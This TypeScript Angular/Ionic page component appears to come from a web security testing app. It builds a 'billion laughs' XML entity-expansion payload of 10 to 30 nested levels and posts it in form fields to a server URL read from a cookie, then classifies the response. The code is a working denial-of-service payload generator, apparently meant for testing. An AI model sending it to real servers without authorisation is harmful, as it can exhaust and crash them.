import { Component, OnInit } from '@angular/core';
import { MenuController, NavController, AlertController } from '@ionic/angular';
import { CookieService } from 'ngx-cookie-service';
import { DataManagement } from 'src/app/services/dataManagement';
import { Form } from 'src/app/app.data.model';
import { HttpParams } from '@angular/common/http';

@Component({
  selector: 'app-test3',
  templateUrl: './test3.page.html',
  styleUrls: ['./test3.page.scss'],
})
export class Test3Page implements OnInit {

  option: string;
  constructor(public menuCtrl: MenuController,
    private cookieService: CookieService,
    public dM: DataManagement,
    public navCtrl: NavController,
    public alertController: AlertController) {

  }

  ngOnInit() {
  }

  runTest() {

    let tenRep = [1, 2, 3, 4, 5, 6, 7, 8, 9];
    let twentyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19];
    let thertyRep = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29];
    let repeticiones = [];
    if (this.option === 'diez') {
      repeticiones = tenRep;
    }
    if (this.option === 'veinte') {
      repeticiones = twentyRep;
    }
    if (this.option === 'treinta') {
      repeticiones = thertyRep;
    }

    let test: string = '<?XML version="1.0"?> <!DOCTYPE lolz [ <!ELEMENT lolz (#PCDATA)> <!ENTITY lol "lol"> ';

    for (let entry1 of repeticiones) {
      test = test + '<!ENTITY lol' + entry1 + ' "';
      for (let entry2 of repeticiones) {
        if (entry1 === 1) {
          test = test + '&lol;';
        } else {
          let numero: number = entry1 - 1;
          test = test + '&lol' + numero + ';';
        }
      }
      test = test + '">';
    }

    test = test + ']> <lolz>&lol9;</lolz>';


    let fd = new HttpParams();
    let form: Form;
    form = JSON.parse(this.cookieService.get('form'));
    let url = form.url;
    for (let entry of form.atributos) {
      if (entry.type === 'none') {
        fd = fd.append(entry.name, entry.value);
      } else {
        fd = fd.append(entry.name, test);
      }
    }

    this.dM
      .runTest(url, fd)
      .then(data => {
        this.navCtrl.navigateRoot('/negative');
      })
      .catch(error => {
        console.log(error);
        if (error.status === 400) {
          this.navCtrl.navigateRoot('/positive');
        }
        if (error.status === 500 || error.status === 502 || error.status === 503 || error.status === 504) {
          this.alertController
            .create({
              header: 'Ha habido un error con su servidor por favor inténtelo más tarde.',
              buttons: ['OK']
            }).then(alertEl => {
              alertEl.present();
            });
        }
        if (error.status === 404) {
          this.alertController
            .create({
              header: 'Hay un fallo con la petición creada por favor creala de nuevo.',
              buttons: ['OK']
            }).then(alertEl => {
              alertEl.present();
            });
        }
        if (error.status === 429) {
          this.alertController
            .create({
              header: 'Han sido enviadas demasiadas solicitudes por favor inténtelo de nuevo más tarde.',
              buttons: ['OK']
            }).then(alertEl => {
              alertEl.present();
            });
        }
        if (error.status === 408) {
          this.alertController
            .create({
              header: 'Por motivos ajenos a nosotros se ha excedido el tiempo de espera de la respuesta por favor inténtelo de nuevo más tarde.',
              buttons: ['OK']
            }).then(alertEl => {
              alertEl.present();
            });
        }
      });
  }

}
